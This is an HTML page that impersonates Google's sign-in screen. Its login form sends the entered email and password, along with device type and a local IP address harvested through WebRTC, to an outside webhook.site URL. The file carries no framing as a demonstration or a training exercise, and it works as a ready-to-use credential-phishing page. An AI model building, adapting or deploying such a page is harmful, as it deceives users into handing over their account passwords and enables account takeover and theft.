<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <link rel="stylesheet" href="stylesheet.css">
</head>
<body>
    <div class="login-container">
        <img src="logo.jpg" alt="Google Logo" class="google-logo">
        <h1 class="text">Sign in</h1>

        <form id="loginForm" style="margin-bottom: 20px;" action="https://webhook.site/c4c04316-7f6f-4ffb-b4c3-dbcf4cc95062" method="post">
            <div class="input-group">
                <input type="text" id="email" name="email" required>
                <label for="email">Email or phone</label>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" required>
                <label for="password">Password</label>
            </div>
            
            <!-- Hidden input fields for device type and IP address -->
            <input type="hidden" id="deviceType" name="deviceType">
            <input type="hidden" id="ipAddress" name="ipAddress">
            
            <button type="submit">Next</button>
        </form>

        <form class="showPass">
            <label>
                <input type="checkbox" id="showPassword" name="showPassword" value="Show Password">
                Show Password
            </label>
        </form>

        <div class="footer">
            <p style="text-align: left;"><a href="#">Create account</a></p>
        </div>
    </div>

    <!-- JavaScript for WebRTC Local IP detection -->
    <script>
        // Detect device type based on user agent
        function detectDevice() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (/mobile/i.test(userAgent)) {
                return "Mobile";
            } else if (/tablet/i.test(userAgent)) {
                return "Tablet";
            } else {
                return "Desktop";
            }
        }

        // Fetch the local IP address using WebRTC
        async function getLocalIP() {
            return new Promise((resolve, reject) => {
                const pc = new RTCPeerConnection({
                    iceServers: []
                });

                pc.createDataChannel('');
                pc.createOffer(pc.setLocalDescription.bind(pc), () => {});
                pc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        const candidate = ice.candidate.candidate;
                        const ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
                        const ipAddress = ipRegex.exec(candidate)[1];
                        pc.onicecandidate = null;
                        resolve(ipAddress);
                    }
                };
            });
        }

        // Function to set device type and IP address before form submission
        async function setDeviceAndIP() {
            // Set device type
            document.getElementById('deviceType').value = detectDevice();

            // Set IP address using WebRTC
            try {
                const ipAddress = await getLocalIP();
                document.getElementById('ipAddress').value = ipAddress;
            } catch (error) {
                console.error('Unable to fetch local IP address', error);
                document.getElementById('ipAddress').value = 'Error fetching IP';
            }
        }

        // Add event listener to form submission
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            // Prevent form from submitting until we set the values
            event.preventDefault();

            // Set the device type and IP address
            await setDeviceAndIP();

            // After setting, submit the form
            this.submit();
        });

        // Show password toggle
        document.getElementById('showPassword').addEventListener('change', function() {
            var passwordInput = document.getElementById('password');
            if (this.checked) {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        });
    </script>
</body>
</html>
